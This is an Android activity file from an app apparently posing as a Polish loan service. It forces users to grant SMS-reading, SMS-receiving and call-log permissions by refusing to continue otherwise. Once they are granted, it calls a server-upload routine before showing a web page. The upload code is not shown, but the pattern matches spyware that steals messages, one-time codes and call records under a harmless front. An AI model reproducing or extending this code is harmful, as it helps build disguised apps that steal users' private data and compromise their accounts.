package com.app.genialnykredyt;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.content.pm.PackageManager;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    String[] apppermissions={
            Manifest.permission.INTERNET,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
    };



    ConnectivityManager connectivityManager;
    public static int PERMISSION_CODE = 100;
    int deniedCount;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        if(checkAndRequestPermissions())
        {
            if(IsNetworkConnected())
            {
                goAhead();

        }
        else
        {
            Toast.makeText(this, "Permissions are necessary to use the site features correctly", Toast.LENGTH_SHORT).show();
        }


        }



    }

    private boolean checkAndRequestPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String permission: apppermissions){
            if(ContextCompat.checkSelfPermission(this,permission) != PackageManager.PERMISSION_GRANTED){
                listPermissionsNeeded.add(permission);
            }
        }

        if(!listPermissionsNeeded.isEmpty()){
            ActivityCompat.requestPermissions(this,listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]),PERMISSION_CODE);
            return false;
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(requestCode==PERMISSION_CODE){
            HashMap<String,Integer> permissionResults=new HashMap<>();
            deniedCount = 0;

            for(int i=0;i<grantResults.length;i++){

                if(grantResults[i] == PackageManager.PERMISSION_DENIED){
                    permissionResults.put(permissions[i],grantResults[i]);
                    deniedCount++;
                }
            }


            //check if all permissions are granted
            if(deniedCount == 0){
                goAhead();
            }
            //At least one or all permission are denied
            else {
                for(Map.Entry<String,Integer> entry: permissionResults.entrySet()){
                    String permName = entry.getKey();
                    int permResult = entry.getValue();

                    //permission is denied. (This is first time ,when "Never Ask Again" is not checked)
                    //so Ask again explaining usage of permission
                    //shouldShowRequestPermissionResultRational return true

                    if(ActivityCompat.shouldShowRequestPermissionRationale(this,permName)){

                        //show dailog for explainaiton
                        showDialog("","This app needs all asked permission to work. Please Grant All Permission ",
                                "YES, Grant Permission", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                                dialog.dismiss();
                                                checkAndRequestPermissions();
                                    }
                                },
                                "No ,Exit App", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                                dialog.dismiss();
                                                finish();
                                    }
                                },false);


                    }
                    //pemission is denied and never ask again is checked
                    //shouldShowRequestPermisionResultsRational return false
                    else{
                        showDialog("",
                                "You have denied some permissions.  Allow all permission at [Setting] > [Permission]",
                                "Go to Settings", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                                Uri.fromParts("package", getPackageName(), null));
                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        startActivity(intent);
                                        finish();

                                    }
                                },
                                "NO ,Exit App", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        finish();
                                    }
                                },false);
                        break;
                    }
                }
            }
        }
    }

    private AlertDialog showDialog(String title, String msg, String positivelable, DialogInterface.OnClickListener possitiveOnClick, String negeativeLable, DialogInterface.OnClickListener negativeOnClick, boolean isCancelable) {
        AlertDialog.Builder alertDailog = new AlertDialog.Builder(this);
        alertDailog.setTitle(title);
        alertDailog.setCancelable(isCancelable);
        alertDailog.setMessage(msg);
        alertDailog.setPositiveButton(positivelable,possitiveOnClick);
        alertDailog.setNegativeButton(negeativeLable,negativeOnClick);
        AlertDialog alert = alertDailog.create();
        alert.show();
        return alert;
    }

    private void goAhead() {
        Context context=getApplicationContext();
        UpdateToServer serverClass=new UpdateToServer(context);
        serverClass.addtoServer(context);

        Thread timer = new Thread(){
            public void run(){
                try{
                    sleep(5000);   // set the duration of splash screen
                    Intent intent = new Intent(MainActivity.this,webActivity.class);
                    startActivity(intent);
                    finish();
                }
                catch(InterruptedException e){
                    e.printStackTrace();
                }
                finally
                {

                }
            }
        };
        timer.start();
    }

    private boolean IsNetworkConnected() {
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        return connectivityManager.getActiveNetworkInfo() != null;
    }


}
